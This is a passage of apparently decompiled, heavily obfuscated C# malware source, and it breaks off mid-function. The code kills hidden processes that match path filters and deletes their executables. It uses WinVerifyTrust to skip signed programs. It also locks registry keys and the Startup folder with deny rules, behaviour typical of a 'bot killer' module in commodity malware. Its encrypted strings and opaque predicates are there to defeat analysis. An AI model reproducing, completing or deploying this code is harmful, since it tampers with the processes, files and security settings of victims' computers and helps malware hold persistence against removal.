using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

[StandardModule]
internal sealed class _________________________________________________
{
	public enum __________________________________________________ : uint
	{
		_ = 1u,
		__,
		___,
		____
	}

	public enum ___________________________________________________ : uint
	{
		_,
		__
	}

	public enum ____________________________________________________ : uint
	{
		_ = 1u,
		__,
		___,
		____,
		_____
	}

	public enum _____________________________________________________ : uint
	{
		_,
		__,
		___,
		____,
		_____
	}

	[Flags]
	public enum ______________________________________________________ : uint
	{
		_ = 1u,
		__ = 2u,
		___ = 4u,
		____ = 0x10u,
		_____ = 0x20u,
		______ = 0x40u,
		_______ = 0x80u,
		________ = 0x100u,
		_________ = 0x200u,
		__________ = 0x400u,
		___________ = 0x800u,
		____________ = 0x1000u
	}

	public enum _______________________________________________________ : uint
	{
		_,
		__
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public class ________________________________________________________
	{
		private int _;

		private IntPtr __;

		private IntPtr ___;

		private IntPtr ____;

		public ________________________________________________________(string string_0)
		{
			_ = Marshal.SizeOf(typeof(________________________________________________________));
			___ = IntPtr.Zero;
			____ = IntPtr.Zero;
			__ = Marshal.StringToCoTaskMemAuto(string_0);
		}

		void object.Finalize()
		{
			try
			{
				Marshal.FreeCoTaskMem(__);
			}
			finally
			{
				base.Finalize();
			}
		}
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public class _________________________________________________________
	{
		private int _;

		private IntPtr __;

		private IntPtr ___;

		private __________________________________________________ ____;

		private ___________________________________________________ _____;

		private ____________________________________________________ ______;

		private IntPtr _______;

		private _____________________________________________________ ________;

		private IntPtr _________;

		private string __________;

		private ______________________________________________________ ___________;

		private _______________________________________________________ ____________;

		public unsafe _________________________________________________________(string string_0)
		{
			_ = Marshal.SizeOf(typeof(_________________________________________________________));
			int num = sizeof(Guid) + -26193;
			switch (0)
			{
			}
			__ = IntPtr.Zero;
			___ = IntPtr.Zero;
			____ = __________________________________________________.__;
			int num2 = num;
			num = -596;
			if (num2 != -26177)
			{
			}
			_____ = ___________________________________________________._;
			_003CModule_003E._______________ = 1203310366;
			______ = ____________________________________________________._;
			if (num != 7441 || (0xBE5 ^ (num + 7129)) * 16 + -124208 == 5 * num + num * 11)
			{
			}
			________ = _____________________________________________________._;
			_________ = IntPtr.Zero;
			__________ = null;
			___________ = ______________________________________________________.________;
			____________ = _______________________________________________________._;
			________________________________________________________ structure = new ________________________________________________________(string_0);
			_______ = Marshal.AllocCoTaskMem(Marshal.SizeOf(typeof(________________________________________________________)));
			Marshal.StructureToPtr((object)structure, _______, fDeleteOld: false);
		}

		void object.Finalize()
		{
			try
			{
				Marshal.FreeCoTaskMem(_______);
			}
			finally
			{
				base.Finalize();
			}
		}
	}

	public enum __________________________________________________________
	{
		_ = 0,
		__ = -2146762751,
		___ = -2146762750,
		____ = -2146762749,
		_____ = -2146762748
	}

	public sealed class ___________________________________________________________
	{
		private static readonly IntPtr _ = new IntPtr(-1);

		private const string m___ = "{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}";

		[DllImport("wintrust.dll", CharSet = CharSet.Unicode, ExactSpelling = true)]
		private static extern __________________________________________________________ WinVerifyTrust([In] IntPtr intptr_0, [In][MarshalAs(UnmanagedType.LPStruct)] Guid guid_0, [In] _________________________________________________________ __________________________________________________________0);

		public static bool __(string string_0)
		{
			try
			{
				_________________________________________________________ _________________________________________________________ = new _________________________________________________________(string_0);
				__________________________________________________________ _________________________________________________________2 = WinVerifyTrust(guid_0: new Guid(_003CModule_003E.______<string>(2211760561u)), intptr_0: _, __________________________________________________________0: _________________________________________________________);
				return _________________________________________________________2 == __________________________________________________________._;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
		}

		private ___________________________________________________________()
		{
		}
	}

	private static int _ = 0;

	private static int __ = 0;

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool IsWindowVisible(IntPtr intptr_0);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr FindWindow(string string_0, string string_1);

	public unsafe static object ___()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num7 = default(int);
		int num8 = default(int);
		int num9 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				nint num5;
				int num6;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 677:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_002e;
						case 4:
							goto IL_0035;
						case 5:
							goto IL_0071;
						case 6:
							goto IL_00b0;
						case 7:
							goto IL_00bd;
						case 12:
							goto IL_00da;
						case 8:
							goto IL_0158;
						case 9:
							goto IL_01d6;
						case 10:
						case 11:
							goto IL_0201;
						case 13:
							goto IL_020e;
						case 14:
							goto IL_0217;
						case 16:
							goto IL_0225;
						case 17:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 15:
						case 18:
						case 19:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_01d6:
					num = 9;
					____(Registry.LocalMachine.OpenSubKey(_003CModule_003E.____<string>(1224473743u), writable: true));
					num5 = (nint)Type.EmptyTypes.LongLength + 2;
					goto IL_00c7;
					IL_0008:
					num = 2;
					if (______________________________________________________________.____)
					{
						num6 = -18446;
						if ((nint)Type.EmptyTypes.LongLength + 13475 != -14878)
						{
							goto IL_002e;
						}
						goto IL_0071;
					}
					goto IL_0225;
					IL_00da:
					num = 12;
					______________________________________________________________.______________(_003CModule_003E.___<string>(3966352008u), _003CModule_003E._______<string>(1725066269u) + _ + _003CModule_003E._______<string>(4119026383u) + __ + _003CModule_003E.______<string>(1060962588u));
					num5 = (nint)Type.EmptyTypes.LongLength + 0;
					goto IL_00c7;
					IL_002e:
					num = 3;
					_____________();
					goto IL_0035;
					IL_0035:
					num = 4;
					____(Registry.CurrentUser.OpenSubKey(_003CModule_003E._____<string>(877248152u), writable: true));
					num6 = -25002;
					if ((nint)Type.EmptyTypes.LongLength + -18446 == -18446)
					{
						goto IL_0071;
					}
					goto IL_01d6;
					IL_0071:
					num6 = -25002;
					num = 5;
					____(Registry.CurrentUser.OpenSubKey(_003CModule_003E._______<string>(1754451375u), writable: true));
					if ((((num7 + 7372) & num7) | -5) == -5 && num6 == -4099)
					{
					}
					goto IL_00b0;
					IL_0225:
					num = 16;
					break;
					IL_00b0:
					num = 6;
					___________(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
					goto IL_00bd;
					IL_00bd:
					num = 7;
					num5 = (nint)Type.EmptyTypes.LongLength + 1;
					goto IL_00c7;
					IL_00c7:
					switch (num5)
					{
					case 2:
						goto IL_0201;
					case 0:
						goto IL_020e;
					}
					if (___________________________________________________________________.________())
					{
						goto IL_0158;
					}
					goto IL_0201;
					IL_020e:
					num = 13;
					_ = 0;
					goto IL_0217;
					IL_0217:
					num = 14;
					__ = 0;
					goto end_IL_0000_3;
					IL_0201:
					num = 11;
					________();
					goto IL_00da;
					IL_0158:
					num = 8;
					____(Registry.LocalMachine.OpenSubKey(_003CModule_003E._____<string>(877248152u), writable: true));
					num6 = -26155;
					if (((12394 + -(num8 + num8) * 2 == num8 + num8 * 3 - 7779) ? (sizeof(ulong) + 1808365056) : (((0x927D51B3u ^ (((uint)num9 / 322u) & (uint)num9)) == 0) ? (-848220905) : ((nint)Type.EmptyTypes.LongLength + 22499))) == 27579)
					{
					}
					goto IL_01d6;
					end_IL_0000_2:
					break;
				}
				num = 17;
				______________________________________________________________.______________(_003CModule_003E._______<string>(1670293721u), _003CModule_003E.___<string>(1727953954u));
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 677;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		object result = default(object);
		return result;
	}

	public static object ____(RegistryKey registryKey_0)
	{
		object result = default(object);
		try
		{
			SecurityIdentifier securityIdentifier = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
			NTAccount nTAccount = securityIdentifier.Translate(typeof(NTAccount)) as NTAccount;
			string identity = nTAccount.ToString();
			RegistrySecurity registrySecurity = new RegistrySecurity();
			registrySecurity.AddAccessRule(new RegistryAccessRule(identity, RegistryRights.ExecuteKey, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Deny));
			registrySecurity.AddAccessRule(new RegistryAccessRule(identity, RegistryRights.Delete | RegistryRights.ChangePermissions | RegistryRights.TakeOwnership, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Deny));
			registryKey_0.SetAccessControl(registrySecurity);
			registryKey_0.Close();
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void _____()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 78:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 4:
						case 5:
							goto IL_0012;
						case 6:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 3:
						case 7:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0012:
					num = 5;
					________();
					break;
					IL_0007:
					num = 2;
					if (!______________________________________________________________.____)
					{
						goto end_IL_0000_3;
					}
					goto IL_0012;
					end_IL_0000_2:
					break;
				}
				num = 6;
				_____________();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 78;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void ______()
	{
		int try0000_dispatch = -1;
		int num4 = default(int);
		int num = default(int);
		int num3 = default(int);
		int num6 = default(int);
		int num7 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				nint num8;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num4 = 1;
					goto IL_0008;
				case 339:
					{
						int num2 = num;
						______________________._______ = -1465986201;
						num3 = num2;
						switch (num4)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num5 = num3 + 1;
						num3 = 0;
						switch (num5)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_001e;
						case 4:
							goto IL_0025;
						case 5:
							goto IL_002c;
						case 6:
							goto IL_00da;
						case 7:
							goto IL_00e2;
						case 9:
							goto IL_00ef;
						case 10:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 8:
						case 11:
						case 12:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_002c:
					num = 5;
					num6 = (int)((nint)Type.EmptyTypes.LongLength + 8238);
					num8 = ((7952 + -num7 * 16 == num7 + 15 * num7) ? ((nint)Type.EmptyTypes.LongLength + -886833348) : ((nint)Type.EmptyTypes.LongLength + 1));
					goto IL_0065;
					IL_0008:
					num = 2;
					if (______________________________________________________________.____)
					{
						num8 = (nint)Type.EmptyTypes.LongLength + 0;
						goto IL_0065;
					}
					goto IL_00ef;
					IL_00ef:
					num = 9;
					break;
					IL_0065:
					switch (num8)
					{
					case 1:
						goto IL_0074;
					}
					goto IL_001e;
					IL_0074:
					______________________________________________________________.______________(_003CModule_003E.______<string>(2655866516u), _003CModule_003E._______<string>(3168522792u) + _ + _003CModule_003E._____<string>(2685991359u) + __ + _003CModule_003E._______<string>(1916090129u));
					if (num6 == 8238)
					{
					}
					goto IL_00da;
					IL_00da:
					num = 6;
					_ = 0;
					goto IL_00e2;
					IL_00e2:
					num = 7;
					__ = 0;
					goto end_IL_0000_3;
					IL_001e:
					num = 3;
					________();
					goto IL_0025;
					IL_0025:
					num = 4;
					_____________();
					goto IL_002c;
					end_IL_0000_2:
					break;
				}
				num = 10;
				______________________________________________________________.______________(_003CModule_003E._______<string>(1670293721u), _003CModule_003E._____<string>(378852616u));
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num4 != 0 && num3 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 339;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num3 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void _______(int int_0, bool bool_0 = false)
	{
		try
		{
			Process processById = Process.GetProcessById(int_0);
			if (processById != null)
			{
				processById.Kill();
				if (bool_0)
				{
					___________(processById.MainModule!.FileName);
				}
				______________________________________________________________.______________(_003CModule_003E.____<string>(3395602991u), _003CModule_003E.____<string>(2428905660u) + int_0);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			______________________________________________________________.______________(_003CModule_003E.___<string>(1387161447u), _003CModule_003E.___<string>(3563673746u) + int_0 + _003CModule_003E.____<string>(3335554409u) + ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public static void ________()
	{
		try
		{
			____________________________________________________________.____(Environment.GetEnvironmentVariable(_003CModule_003E.____<string>(4280475304u)));
			____________________________________________________________.____(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
			Process[] processes = Process.GetProcesses();
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				Process process = processes[i];
				try
				{
					string fullPath = Path.GetFullPath(process.MainModule!.FileName);
					if (__________(fullPath) && !____________(process.MainWindowTitle))
					{
						________________(fullPath);
						try
						{
							process.Kill();
							_++;
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	public static bool _________()
	{
		try
		{
			if (___________________________________________________________.__(Application.get_ExecutablePath()))
			{
				return true;
			}
			return false;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public unsafe static bool __________(string string_0)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		bool flag = default(bool);
		string[] array2 = default(string[]);
		string[] array = default(string[]);
		int num7 = default(int);
		string text = default(string);
		string text2 = default(string);
		int num8 = default(int);
		FileAttributes attributes = default(FileAttributes);
		int num9 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				int num5;
				nint num6;
				string text3;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 1523:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 4:
						case 5:
							goto IL_002d;
						case 25:
							goto IL_0086;
						case 29:
							goto IL_009a;
						case 30:
						case 31:
							goto IL_00b0;
						case 32:
							goto IL_00bb;
						case 34:
						case 35:
							goto IL_00d2;
						case 6:
							goto IL_00ee;
						case 7:
						case 8:
							goto IL_0101;
						case 10:
						case 11:
							goto IL_0113;
						case 36:
							goto IL_0136;
						case 37:
						case 38:
							goto IL_0147;
						case 40:
						case 41:
							goto IL_016f;
						case 43:
						case 44:
							goto IL_01be;
						case 46:
						case 47:
							goto IL_01f3;
						case 48:
							goto IL_01fd;
						case 12:
							goto IL_0250;
						case 13:
						case 14:
							goto IL_0264;
						case 16:
						case 17:
							goto IL_0281;
						case 19:
						case 20:
							goto IL_02af;
						case 21:
							goto IL_02dc;
						case 24:
							goto IL_0350;
						case 22:
							goto IL_03c4;
						case 23:
							goto IL_03e9;
						case 27:
						case 28:
							goto IL_03f8;
						case 49:
							goto IL_0416;
						case 45:
							goto IL_0421;
						case 18:
							goto IL_0431;
						case 26:
							goto IL_0446;
						case 9:
							goto IL_0474;
						case 33:
							goto IL_047f;
						case 39:
							goto IL_048a;
						case 3:
							goto IL_0495;
						case 50:
						case 51:
							goto IL_049f;
						case 52:
							goto IL_04bb;
						case 53:
						case 54:
							goto IL_04c6;
						case 42:
							goto IL_04d9;
						case 15:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 55:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_048a:
					num = 39;
					flag = true;
					goto end_IL_0000_3;
					IL_0008:
					num = 2;
					if (!string_0.Contains(Application.get_ExecutablePath()))
					{
						goto IL_002d;
					}
					if (7191 != 23425)
					{
						goto IL_0495;
					}
					goto IL_04b5;
					IL_016f:
					num = 41;
					num5 = _003CModule_003E.___________;
					if ((((((uint)num5 / 67108864u - 8380) & 0x1BD82D00) == 467143936) ? 27595 : (sizeof(float) + 1695121387)) == 27595)
					{
						goto IL_01b3;
					}
					goto IL_0495;
					IL_002d:
					num = 5;
					num6 = (nint)Type.EmptyTypes.LongLength + 0;
					goto IL_0037;
					IL_0037:
					switch (num6)
					{
					case 17:
						break;
					case 5:
						goto IL_009a;
					case 3:
						goto IL_00b3;
					default:
						goto IL_00e1;
					case 7:
						goto IL_0124;
					case 10:
						goto IL_01f6;
					case 14:
						goto IL_0243;
					case 12:
						goto IL_034a;
					case 2:
						goto IL_03c4;
					case 1:
						goto IL_03e9;
					case 4:
						goto IL_0416;
					case 11:
						goto IL_0421;
					case 15:
						flag = true;
						goto end_IL_0000_3;
					case 9:
						goto IL_047f;
					case 6:
						goto IL_04d1;
					case 8:
						goto end_IL_0000_2;
					case 13:
					case 16:
						goto end_IL_0000_3;
					}
					goto IL_0086;
					IL_0421:
					num = 45;
					flag = true;
					goto end_IL_0000_3;
					IL_0416:
					num = 49;
					flag = true;
					goto end_IL_0000_3;
					IL_03e9:
					num = 23;
					array2 = array;
					num7 = 0;
					goto IL_009d;
					IL_03c4:
					num = 22;
					array = Strings.Split(text, _003CModule_003E.___<string>(3242391558u), -1, (CompareMethod)0);
					num6 = sizeof(float) + -3;
					goto IL_0037;
					IL_034a:
					text2 = array2[num7];
					goto IL_0350;
					IL_0350:
					num = 24;
					text3 = text2;
					num8 = _003CModule_003E.______________;
					if (Operators.CompareString(text3, _003CModule_003E.__________((int)(((0x51FFFFFF | ((int)((uint)num8 / 32768u) - -1888323076)) != 1912602623) ? ((nint)Type.EmptyTypes.LongLength + 1609821871) : ((nint)Type.EmptyTypes.LongLength + 49215)), (int)((nint)Type.EmptyTypes.LongLength + 51066), sizeof(int) + 142), false) != 0)
					{
						num6 = (nint)Type.EmptyTypes.LongLength + 17;
						goto IL_0037;
					}
					goto IL_03f8;
					IL_04b5:
					if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
					{
						goto IL_04bb;
					}
					goto IL_04c6;
					IL_04d9:
					num = 42;
					flag = false;
					if (-24880 == 7365)
					{
						break;
					}
					goto end_IL_0000_3;
					IL_049f:
					num = 51;
					if (sizeof(float) + 1771 != -31036)
					{
						goto IL_04b5;
					}
					goto IL_04d1;
					IL_0495:
					num = 3;
					flag = false;
					goto end_IL_0000_3;
					IL_0243:
					if (string_0.Contains(______________________________________________________________._______________________))
					{
						goto IL_0250;
					}
					goto IL_0264;
					IL_0250:
					num = 12;
					flag = false;
					num6 = (nint)Type.EmptyTypes.LongLength + 16;
					goto IL_0037;
					IL_0264:
					num = 14;
					if (string_0.Contains(______________________.____))
					{
						num6 = sizeof(double) + 0;
						goto IL_0037;
					}
					goto IL_0281;
					IL_01b3:
					if (!___________________________________________________________.__(string_0))
					{
						goto IL_01be;
					}
					goto IL_04d9;
					IL_0281:
					num = 17;
					if ((nint)Type.EmptyTypes.LongLength + -22014 != 21986)
					{
						if (!string_0.Contains(_003CModule_003E._____<string>(1091295400u)))
						{
							goto IL_02af;
						}
						goto IL_0431;
					}
					goto end_IL_0000_3;
					IL_01be:
					num = 44;
					if (string_0.Contains(Environment.GetEnvironmentVariable(_003CModule_003E._____<string>(43036125u))) | string_0.Contains(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData)))
					{
						num6 = sizeof(ulong) + 3;
						goto IL_0037;
					}
					goto IL_01f3;
					IL_02af:
					num = 20;
					text = __________________________________________________________________.____(_003CModule_003E._____<string>(1665368331u));
					if ((uint)num8 / 10160075u + 1371144192 != (uint)num8 / 2u >> 14)
					{
						goto IL_02dc;
					}
					goto IL_04b5;
					IL_02dc:
					num = 21;
					if (Operators.CompareString(text, _003CModule_003E.__________((int)((nint)Type.EmptyTypes.LongLength + 58755), sizeof(ushort) + 58553, (int)((nint)Type.EmptyTypes.LongLength + 138)), false) != 0)
					{
						num6 = (((-(num9 * 15 + num9) & 5) != (5 & (0x50 ^ (num9 << 16)))) ? (sizeof(ushort) + -1818948216) : ((nint)Type.EmptyTypes.LongLength + 2));
						goto IL_0037;
					}
					goto IL_00b0;
					IL_04bb:
					num = 52;
					flag = true;
					goto end_IL_0000_3;
					IL_01f3:
					num = 47;
					goto IL_01f6;
					IL_01f6:
					attributes = File.GetAttributes(string_0);
					goto IL_01fd;
					IL_0431:
					num = 18;
					goto IL_04d1;
					IL_0086:
					num = 25;
					if (!string_0.Contains(text2))
					{
						goto IL_03f8;
					}
					goto IL_0446;
					IL_0446:
					num = 26;
					flag = true;
					goto end_IL_0000_3;
					IL_03f8:
					num7++;
					if ((nint)Type.EmptyTypes.LongLength + -4426 == -4426)
					{
						goto IL_009a;
					}
					goto IL_0474;
					IL_009a:
					num = 29;
					goto IL_009d;
					IL_009d:
					if (num7 < array2.Length)
					{
						num6 = (nint)Type.EmptyTypes.LongLength + 12;
						goto IL_0037;
					}
					goto IL_00b0;
					IL_01fd:
					num = 48;
					if ((attributes & FileAttributes.System) == FileAttributes.System)
					{
						num6 = (((0x935B2FFFu | ((uint)num9 % 2048u / 8282672u)) == 2472226815u) ? (sizeof(long) + -4) : ((nint)Type.EmptyTypes.LongLength + -864231588));
						goto IL_0037;
					}
					goto IL_049f;
					IL_00b0:
					num = 31;
					goto IL_00b3;
					IL_00b3:
					if (____________________________________________________________._____(string_0))
					{
						goto IL_00bb;
					}
					goto IL_00d2;
					IL_00bb:
					num = 32;
					____________________________________________________________.________(string_0);
					num6 = (nint)Type.EmptyTypes.LongLength + 9;
					goto IL_0037;
					IL_00d2:
					num = 35;
					if (num8 + 1879048192 == num8)
					{
						goto IL_00e1;
					}
					goto IL_0124;
					IL_00e1:
					if (string_0.Contains(_____________________________________________________________________________.__))
					{
						goto IL_00ee;
					}
					goto IL_0101;
					IL_00ee:
					num = 6;
					flag = false;
					num6 = (nint)Type.EmptyTypes.LongLength + 13;
					goto IL_0037;
					IL_0101:
					num = 8;
					if (!string_0.Contains(______________________._))
					{
						goto IL_0113;
					}
					if (709376 + (uint)num2 / 524288u % 15u != (uint)((num2 & 0x31A) - 3278 << 8))
					{
						goto IL_0474;
					}
					goto IL_047f;
					IL_0113:
					num = 11;
					num6 = (nint)Type.EmptyTypes.LongLength + 14;
					goto IL_0037;
					IL_04c6:
					num = 54;
					flag = false;
					goto end_IL_0000_3;
					IL_0474:
					num = 9;
					flag = false;
					goto end_IL_0000_3;
					IL_047f:
					num = 33;
					flag = true;
					goto end_IL_0000_3;
					IL_0124:
					if (string_0.Contains(_003CModule_003E.______<string>(1919640693u)))
					{
						goto IL_0136;
					}
					goto IL_0147;
					IL_0136:
					num = 36;
					num6 = (nint)Type.EmptyTypes.LongLength + 15;
					goto IL_0037;
					IL_0147:
					num = 38;
					if (!string_0.Contains(RuntimeEnvironment.GetRuntimeDirectory()))
					{
						goto IL_016f;
					}
					if ((nint)Type.EmptyTypes.LongLength + 27488 == 27270)
					{
						goto IL_01b3;
					}
					goto IL_048a;
					IL_04d1:
					flag = false;
					goto end_IL_0000_3;
					end_IL_0000_2:
					break;
				}
				num = 15;
				flag = false;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 1523;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		bool result = flag;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static void ___________(string string_0)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(string_0);
			DirectorySecurity directorySecurity = new DirectorySecurity();
			directorySecurity.SetAccessRuleProtection(isProtected: true, preserveInheritance: false);
			directoryInfo.SetAccessControl(directorySecurity);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static bool ____________(string string_0)
	{
		try
		{
			IntPtr intptr_ = FindWindow(null, string_0);
			return IsWindowVisible(intptr_);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void _____________()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string[] files = default(string[]);
		string[] array = default(string[]);
		int num6 = default(int);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				nint num5;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 335:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 6:
							goto IL_003d;
						case 4:
							goto IL_0051;
						case 3:
							goto IL_0068;
						case 5:
							goto IL_0083;
						case 7:
						case 8:
							goto IL_009f;
						case 9:
							goto IL_00ba;
						case 10:
							goto IL_00ca;
						case 11:
							goto IL_00e0;
						case 12:
						case 13:
							goto IL_00fb;
						default:
							goto end_IL_0000;
						case 14:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_003d:
					num = 6;
					______________(_003CModule_003E.___<string>(478819883u), 2);
					goto IL_009f;
					IL_0008:
					num = 2;
					______________(_003CModule_003E.____<string>(1981230373u), 1);
					num5 = (nint)Type.EmptyTypes.LongLength + 2;
					goto IL_0022;
					IL_0022:
					switch (num5)
					{
					case 4:
						break;
					default:
						goto IL_0068;
					case 1:
						goto IL_00ae;
					case 0:
						goto IL_00bf;
					case 3:
						goto IL_00c4;
					}
					goto IL_003d;
					IL_00ae:
					files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
					goto IL_00ba;
					IL_00ba:
					num = 9;
					array = files;
					goto IL_00bf;
					IL_00bf:
					num6 = 0;
					goto IL_00f2;
					IL_00f2:
					if (num6 < array.Length)
					{
						goto IL_00c4;
					}
					goto end_IL_0000_2;
					IL_00c4:
					text = array[num6];
					goto IL_00ca;
					IL_00ca:
					num = 10;
					if (!text.Contains(_003CModule_003E._______<string>(4209201204u)))
					{
						goto IL_00e0;
					}
					goto IL_00ea;
					IL_00e0:
					num = 11;
					________________(text);
					goto IL_00ea;
					IL_00ea:
					num6++;
					goto IL_00fb;
					IL_00fb:
					num = 13;
					goto IL_00f2;
					IL_0068:
					num = 3;
					______________(_003CModule_003E.____<string>(3066385040u), 1);
					goto IL_0051;
					IL_0051:
					num = 4;
					if ((nint)Type.EmptyTypes.LongLength + 13289 == 5720)
					{
						goto IL_0068;
					}
					if (___________________________________________________________________.________())
					{
						goto IL_0083;
					}
					goto IL_009f;
					IL_009f:
					num = 8;
					num5 = (nint)Type.EmptyTypes.LongLength + 1;
					goto IL_0022;
					IL_0083:
					num = 5;
					______________(_003CModule_003E.______<string>(4227001192u), 2);
					num5 = (nint)Type.EmptyTypes.LongLength + 4;
					goto IL_0022;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 335;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static void ______________(string string_0, int int_0)
	{
		try
		{
			RegistryKey registryKey = default(RegistryKey);
			if (int_0 == 1)
			{
				registryKey = Registry.CurrentUser.OpenSubKey(string_0);
				switch ((nint)Type.EmptyTypes.LongLength + 0)
				{
				}
			}
